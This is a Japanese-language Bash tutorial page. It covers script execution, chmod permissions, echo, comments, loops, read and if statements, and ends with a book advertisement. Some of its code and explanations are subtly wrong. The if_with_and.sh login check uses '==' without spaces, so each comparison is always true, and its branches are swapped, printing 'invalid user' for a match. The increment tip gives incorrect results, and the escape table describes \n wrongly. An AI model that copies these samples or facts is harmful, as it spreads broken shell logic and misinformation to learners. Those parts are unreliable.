２．bashファイルに実行権限を設定し、ファイルを実行する方法&lt;/p>
&lt;p>一つ目の方法「bashコマンドを使用する」&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash HelloWorld.sh
&lt;/code>&lt;/pre>&lt;p>もう一つの方法「chmodで実行権限を付与する」&lt;/p>
&lt;pre tabindex="0">&lt;code># +x で実行権限を付与
$ chmod +x HelloWorld.sh
# ドット　スラッシュをつけて実行
$ ./HelloWorld.sh
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>$ ./ でファイルを実行する場合、ソースファイルの先頭行に記載されている&lt;/dd>
&lt;dd>
&lt;p>#!/bin/bash&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>という記述をつかって実行されます。&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>$ ./&amp;lt;ファイル名&amp;gt;&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>で実行した場合は、bashコマンド（/bin/bash )を使って実行することを、ソースファイルの先頭で宣言している。という事になります。&lt;/p>
&lt;/dd>
&lt;dd>このソースファイルの1行目の記述を「シェバン」と言います。&lt;/dd>
&lt;dd>
&lt;p>/usr/local/bin/awk&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>にあるコマンドを使ってソースファイルを実行( ./&amp;lt;ファイル名&amp;gt;）したい場合は、ソースファイルの先頭行に&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>#!/usr/local/bin/awk&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>と、記述します。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>考え方ですが、bashコマンドで実行する場合のメリットは、ファイルに闇雲に実行権限を与える必要がないことです。実行権限を与える方法は、一般的ではありますが注意も必要です。&lt;/p>
&lt;p>chmod の実行権限には +x で実行権限を付与する方法の他、0755 などの数字で付与する場合もあります。&lt;br>
これらを&lt;font color=red>パーミッション&lt;/font>と言います。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>考え方ですが、bashコマンドでファイルを実行する場合のメリットは、ファイルに実行権限をやみくもに与える必要がないことです。&lt;/dd>
&lt;dd>同時に、第三者が簡単にファイルを実行できる事を防ぐ、自分自身が誤ってファイルを実行してしまうというケアレスミスを防ぐことができます。&lt;/dd>
&lt;dd>実行権限を与える方法は、一般的ではありますが、注意も必要です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>パーミッションの確認&lt;br>
ターミナルのコマンドでカレントディレクトリ内のファイルやディレクトリの情報を確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ls -l
&lt;/code>&lt;/pre>&lt;p>上記のコマンドを実行すると、以下のような一覧が表示されるかと思います。&lt;/p>
&lt;pre tabindex="0">&lt;code>-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt
drwxr-xr-x 6 user group 20480 1月 1 00:00 ダウンロード
&lt;/code>&lt;/pre>&lt;p>パーミッションの読み方&lt;br>
「-rw-r&amp;ndash;r&amp;ndash;」や「drwxr-xr-x」の先頭の謎の10文字についてですが、&lt;br>
最初の１文字目はファイル種別を表しています。&lt;br>
-rw-r&amp;ndash;r&amp;ndash;&lt;/p>
&lt;table>
&lt;tr>&lt;th>種別&lt;/th>&lt;th>意味&lt;/th>&lt;/tr>
&lt;tr>&lt;td>-&lt;/td>&lt;td>ファイル&lt;/td>&lt;/tr>
&lt;tr>&lt;td>d&lt;/td>&lt;td>ディレクトリ&lt;/td>&lt;/tr>
&lt;tr>&lt;td>l&lt;/td>&lt;td>シンボリックリンク&lt;/td>&lt;/tr>
&lt;/table>
&lt;p>2文字目から4文字目はファイルの所有者に対する権限を表し、&lt;br>
5文字目から7文字目はファイルの所有グループに対する権限を表し、&lt;br>
8文字目から10文字目はその他に対する権限を表しています&lt;/p>
&lt;p>上記から-rw-r&amp;ndash;r&amp;ndash;は、&lt;br>
「ファイル種別」が「ファイル」であり、&lt;br>
「所有者」に「読み取り」と「書き込み」の権限があり、&lt;br>
「所有グループ」に「読み取り」の権限があり、&lt;br>
「その他」に「読み取り」の権限があることを示しています。&lt;/p>
&lt;p>drwxr-xr-xは、&lt;br>
「ファイル種別」が「ディレクトリ」であり、&lt;br>
「所有者」に「読み取り」と「書き込み」と「実行」の権限があり、&lt;br>
「所有グループ」に「読み取り」と「実行」の権限があり、&lt;br>
「その他」に「読み取り」と「実行」の権限があることを示しています。&lt;/p>
&lt;p>アクセス権限の変更&lt;br>
アクセス権限を変更する方法について記載します。&lt;/p>
&lt;p>パーミッションの変更には&lt;font color=red>&lt;b> chmodコマンド&lt;/b>&lt;/font>を使用します。&lt;/p>
&lt;p>数値で指定する&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls -l　
-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt
$ chmod 764 hoge.txt
$ ls -l
-rwxrw-r-- 1 user group 9 1月 1 00:00 hoge.txt
&lt;/code>&lt;/pre>&lt;p>上記のコマンドはhoge.txtに対してパーミッションの確認→変更→確認を行っています。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ chmod 764 hoge.txt
&lt;/code>&lt;/pre>&lt;p>に関して説明していきます。&lt;br>
ファイルのパーミッションの変更は以下の通りコマンドを実行すれば可能です。&lt;/p>
&lt;pre tabindex="0">&lt;code>chmod モード 対象ファイル名
&lt;/code>&lt;/pre>&lt;p>モードの数字について&lt;/p>
&lt;table>
&lt;tr>&lt;th>モード(数字)&lt;/th>&lt;th>モード(アルファベット)&lt;/th>&lt;th>権限&lt;/th>&lt;/tr>
&lt;tr>&lt;td>4&lt;/td>&lt;td>r&lt;/td>&lt;td>読み取り&lt;/td>&lt;/tr>
&lt;tr>&lt;td>2&lt;/td>&lt;td>w&lt;/td>&lt;td>書き込み&lt;/td>&lt;/tr>
&lt;tr>&lt;td>1&lt;/td>&lt;td>x&lt;/td>&lt;td>実行&lt;/td>&lt;/tr>
&lt;/table>
上記の合計値を「所有者」「所有グループ」「その他」の順で入力することでパーミッションを変更することができます。
要するに上記の「764」は
「所有者」に対して「読み取り」「書き込み」「実行」を、
「所有グループ」に対して「読み取り」「書き込み」を、
「その他」に「読み取り」を付与しています。
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>実行したい場合は $ chmod 755 &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>読み取りのみを許可し、実行しない場合は $ chmod 644 &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>自分だけの読み取りを許可する場合は $ chmod 600 &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>通常は上記３種類しか使いません。&lt;/dd>
&lt;dd>CGI などを使う場合は $ chown や $chgrp を組み合わせて使うことが多いです。&lt;/dd>
&lt;dd>$ chmod 777 &amp;lt;ファイル名&amp;gt; というパーミッションを軽率に与えず、上手にコマンドを使いこなすことがセキュリティにつながります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>詳しくはこちら&lt;br>
&lt;a class="link" href="https://qiita.com/shisama/items/5f4c4fa768642aad9e06" target="_blank" rel="noopener"
>https://qiita.com/shisama/items/5f4c4fa768642aad9e06&lt;/a>&lt;/p>
&lt;h2 id="echo-コマンド">echo コマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> echoコマンドの使用：&lt;/b>&lt;/font>&lt;br>
さまざまなオプションでechoコマンドを使用できます。&lt;br>
次の例では、いくつかの便利なオプションについて説明します。&lt;br>
オプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。&lt;br>
&amp;lsquo;-n&amp;rsquo;オプションは、改行なしでテキストを印刷するために使用され、'-e&amp;rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。&lt;br>
&amp;lsquo;echo_example.sh&amp;rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:echo_example.sh" data-lang="bash:echo_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;改行付きのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -n &lt;span class="s2">&amp;#34;改行なしのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;\n削除\tバックスラッシュ\t文字\n&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash echo_example.sh
改行付きのテキストの印刷
改行なしのテキストの印刷
削除 バックスラッシュ 文字
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>echo の利用例は果てしない。ここで説明してもだれも読みはしないだろう。なので、概要の抜粋を説明する&lt;/dd>
&lt;dd>
&lt;p>echo でよく使われるオプションは以下の通り&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>オプション 意味&lt;/p>
&lt;/dd>
&lt;dd>-n 最後の改行を出力しない&lt;/dd>
&lt;dd>-e エスケープシーケンスを解釈する&lt;/dd>
&lt;dd>-E エスケープシーケンスを解釈しない（デフォルト）&lt;/dd>
&lt;dd>
&lt;p>エスケープシーケンスとは、上記のバックスラッシュのことだ。&lt;/p>
&lt;/dd>
&lt;dd>以下の4つを覚えておくだけでおおよそは事足りる。&lt;/dd>
&lt;dd>
&lt;p>オプション 意味&lt;/p>
&lt;/dd>
&lt;dd>\r キャリッジリターン&lt;/dd>
&lt;dd>\n 改行（フォームフィード＋キャリッジリターン）&lt;/dd>
&lt;dd>\t 水平タブ&lt;/dd>
&lt;dd>\ バックスラッシュ&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="コメント">コメント&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> コメントの使用&lt;/b>&lt;/font>&lt;br>
「#」記号は、bashスクリプトに1行コメントを追加するために使用されます。&lt;br>
&amp;lsquo;comment_example.sh&amp;rsquo;という名前の新しいファイルを作成し、1行コメント付きの次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:comment_example.sh" data-lang="bash:comment_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1">#2つの数値をsumに追加します&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">sum&lt;/span>&lt;span class="o">=&lt;/span>25+35&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#結果を出力します&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$sum&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash comment_example.sh
60
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>複数行コメントに関しては次の章で説明します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="マルチラインコメント">マルチラインコメント&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> 複数行コメントの使用&lt;/b>&lt;/font>&lt;br>
bashではさまざまな方法で複数行コメントを使用できます。&lt;br>
次の例に簡単な方法を示します。&lt;br>
&amp;lsquo;multiline-comment.sh&amp;rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。&lt;br>
ここでは、「:」と「'」でbashで複数行コメントを実現しています。&lt;br>
次のスクリプトは、5の2乗を計算します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:multiline-comment.sh" data-lang="bash:multiline-comment.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
: &lt;span class="s1">&amp;#39;
&lt;/span>&lt;span class="s1">次のスクリプトは、
&lt;/span>&lt;span class="s1">数値の2乗値5を計算します。
&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">area&lt;/span>&lt;span class="o">=&lt;/span>5*5&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$area&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash multiline-comment.sh
25
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>多くの場合、マルチラインコメントの存在は知られていない。&lt;/dd>
&lt;dd>ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。&lt;/dd>
&lt;dd>それは、過去のメジャーソースコードの冒頭にそうあるからだ。&lt;/dd>
&lt;dd>そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。&lt;/dd>
&lt;dd>
&lt;p>今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:&amp;gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>if [ &amp;ldquo;$v&amp;rdquo; -eq 5 ];then&lt;/p>
&lt;/dd>
&lt;dd>: # 何もしない&lt;/dd>
&lt;dd>fi&lt;/dd>
&lt;dd>
&lt;p>touchは既にファイルがあれば、そのファイルにはさわらない。&lt;/p>
&lt;/dd>
&lt;dd>:&amp;gt; は既にファイルがあれば、そのファイルさえも空にする。&lt;/dd>
&lt;dd>上記 if 文の中の : は　何もしないことを示す。&lt;/dd>
&lt;dd>マルチラインコメントも同じ「:」から始まり、何もしないことを示している。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="while-ループ">while ループ&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> whileループの使用&lt;/b>&lt;/font>&lt;br>
whileループの使用法を知るために、「while_example.sh」という名前のbashファイルを作成します。&lt;br>
この例では、whileループが5回繰り返されます。&lt;br>
count変数の値は、各ステップで1ずつ増加します。&lt;br>
count変数の値が5になると、whileループは終了します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:while_exapmle.sh" data-lang="bash:while_exapmle.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">valid&lt;/span>&lt;span class="o">=&lt;/span>true&lt;span class="p">;&lt;/span>
&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$valid&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">5&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
break&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="o">((&lt;/span>count++&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash while_example.sh
1
2
3
4
5
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>上記ソースでトリッキーなのはwhileよりもむしろ&lt;/dd>
&lt;dd>
&lt;p>((COUNT++))&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>だろう。&lt;/p>
&lt;/dd>
&lt;dd>COUNT = COUNT + 1;&lt;/dd>
&lt;dd>
&lt;p>count=1&lt;/p>
&lt;/dd>
&lt;dd>count=$(expr $count + 1) # =&amp;gt; 2&lt;/dd>
&lt;dd>let ++count # =&amp;gt; 2&lt;/dd>
&lt;dd>let count++ # =&amp;gt; 3&lt;/dd>
&lt;dd>count=$((++count)) # =&amp;gt; 2&lt;/dd>
&lt;dd>count=$((count++)) # =&amp;gt; 2&lt;/dd>
&lt;dd>count=$((count += 1)) # =&amp;gt; 3&lt;/dd>
&lt;dd>
&lt;p>変数に代入する必要がないから $(( )) ではなく、&lt;/p>
&lt;/dd>
&lt;dd>(( )) でよい。(( )) の中の変数を表す「$」は記述の必要はない&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="for-ループ">for ループ&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> forループの使用&lt;/b>&lt;/font>&lt;br>
基本的なforループ宣言を示します。&lt;br>
&amp;lsquo;for_example.sh&amp;rsquo;という名前のファイルを作成し、forループを使用して、次のスクリプトを追加します。&lt;br>
ここでは、forループは10回繰り返され、変数のすべての値、counterを1行で出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:for_example.sh" data-lang="bash:for_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="o">((&lt;/span>&lt;span class="nv">counter&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span>counter&amp;gt;0&lt;span class="p">;&lt;/span>counter--&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> -n &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$counter&lt;/span>&lt;span class="s2"> &amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="nb">printf&lt;/span> &lt;span class="s2">&amp;#34;\n&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash for_example.sh
10 9 8 7 6 5 4 3 2 1
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>以下、どの記法も同じ。書きやすいものを選べばいい。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code class="language-bash:三つの書き方" data-lang="bash:三つの書き方"># 冗長
for i in \`seq 10\`
do
echo &amp;quot;test&amp;quot;
done
# 簡素
for i in \`seq 10\`;do
echo &amp;quot;test&amp;quot;
done
# C/Javaライク
for((i=0;i&amp;lt;10;i++));do
echo &amp;quot;test&amp;quot;
done
&lt;/code>&lt;/pre>&lt;h2 id="対話型入力">対話型入力&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> ユーザー入力の取得&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;read&amp;rsquo;コマンドは、bashでユーザーから入力を受け取るために使用されます。&lt;br>
&amp;lsquo;user_input.sh&amp;rsquo;という名前のファイルを作成し、ユーザーから入力を取得するための次のスクリプトを追加します。&lt;br>
ここでは、1つの文字列値がユーザーから取得され、他の文字列値を組み合わせて値が表示されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:user_input.sh" data-lang="bash:user_input.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたの名前を入力して下さい&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> name
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ようこそ &lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2">. ＮＬＰへ&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash user_input.sh
あなたの名前を入力して下さい
suzuki
ようこそ suzuki。 ＮＬＰへ
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>以下のソースは read コマンドの手前でechoすらしない&lt;/dd>
&lt;dd>-p オプションだ。&lt;/dd>
&lt;dd>
&lt;p>read -p &amp;ldquo;INPUT:&amp;rdquo; str&lt;/p>
&lt;/dd>
&lt;dd>echo $str1&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="if-文">If 文&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> if文を使う&lt;/b>&lt;/font>&lt;br>
単数、または複数の条件でif条件を使用できます。&lt;br>
このステートメントの開始ブロックと終了ブロックは、「if」と「fi」で定義されます。&lt;br>
「simple_if.sh」という名前のファイルを作成し、bashでのifステートメントの使用を確認します。&lt;br>
ここでは、変数nに10が割り当てられています。&lt;br>
$nの値が10未満の場合、出力は「1桁の数値です」になります。&lt;br>
それ以外の場合、出力は「2桁の数値です」になります。&lt;br>
比較のために、ここでは「-lt」を使用しています。&lt;/p>
&lt;table>
&lt;tr>&lt;th>オプション&lt;/th>&lt;th>意味&lt;/th>&lt;/tr>
&lt;tr>&lt;td>-eq&lt;/td>&lt;td>同　じ（==）&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-lt&lt;/td>&lt;td>小さい（＜）&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-gt&lt;/td>&lt;td>大きい（＞）&lt;/td>&lt;/tr>
&lt;/table>
&lt;p>数値を比較する場合は、「&amp;lt;」「&amp;gt;」「=」ではなく、&lt;br>
-eq -lt -gt を使う必要があります。&lt;/p>
&lt;p>文字列を比較する場合は 「==」または 「!=」を使います。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:simple_if.sh" data-lang="bash:simple_if.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">n&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$n&lt;/span> -lt &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;1桁の数値です&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;2桁の数値です&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash simple_if.sh
2桁の数値です
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>数値を比較する場合は、「&amp;lt;」「&amp;gt;」「=」ではなく、&lt;/dd>
&lt;dd>-eq -lt -gt を使う必要があります。&lt;/dd>
&lt;dd>
&lt;p>文字列を比較する場合は 「==」または 「!=」を使います。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="and-条件を-if-文で使う">and 条件を if 文で使う&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ANDロジックでifステートメントを使用する：&lt;/b>&lt;/font>&lt;br>
2つ以上の条件を持つifステートメントでは、さまざまなタイプの論理条件を使用できます。&lt;br>
andロジックを使用してifステートメントで複数の条件を定義する方法を次の例に示します。&lt;br>
&amp;lsquo;&amp;amp;&amp;amp;&amp;lsquo;は、ifステートメントのandロジックを適用するために使用されます。&lt;br>
&amp;lsquo;if_with_and.sh&amp;rsquo;という名前のファイルを作成して、次のコードを確認します。&lt;br>
ここで、ユーザー名とパスワードの変数の値はユーザーから取得され、「admin」および「secret」と比較されます。&lt;br>
両方の値が一致する場合、出力は「有効なユーザー」になります。一致しない場合、出力は「無効なユーザー」になります。&lt;/p>
&lt;font color=red>
数値を比較する場合は、「&lt;」「>」「=」ではなく、
-eq -lt -gt を使う必要があります。
文字列を比較する場合は 「==」または 「!=」を使います。
&lt;/font>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:if_with_and.sh" data-lang="bash:if_with_and.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;名前を入力して下さい&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> username
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;パスワードを入力して下さい&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> password
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$username&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$password&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;secret&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;無効なユーザーです&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;有効なユーザーです&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash if_with_and.sh
名前を入力して下さい
suzuki
パスワードを入力して下さい
password
無効なユーザーです
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>数値を比較する場合は、「&amp;lt;」「&amp;gt;」「=」ではなく、&lt;/dd>
&lt;dd>-eq -lt -gt を使う必要があります。&lt;/dd>
&lt;dd>
&lt;p>文字列を比較する場合は 「==」または 「!=」を使います。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;!--
## １０．or 条件を if文で使う
## １１．else if と else
## １２．case 文
## １３．コマンドラインから引数を取得
## １４．名前を使用してコマンドラインから引数を取得する
## １５．変数に2つの文字列を組み合わせる
## １６．文字列の部分文字列を取得する
## １７．変数に2つの数値を追加します
## １８．関数を作成する
## １９．関数パラメーターを使用する
## ２０．スクリプトからの戻り値を渡す
## ２１．ディレクトリを作成する
## ２２．存在を確認してディレクトリを作成する
## ２３．ファイルを読む
## ２４．ファイルを削除する
## ２５．ファイルに追加
## ２６．ファイルが存在するかどうかを確認
## ２７．mailコマンド
## ２８．dateコマンド
## ２９．waitコマンド
## ３０．sleepコマンド
-->
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
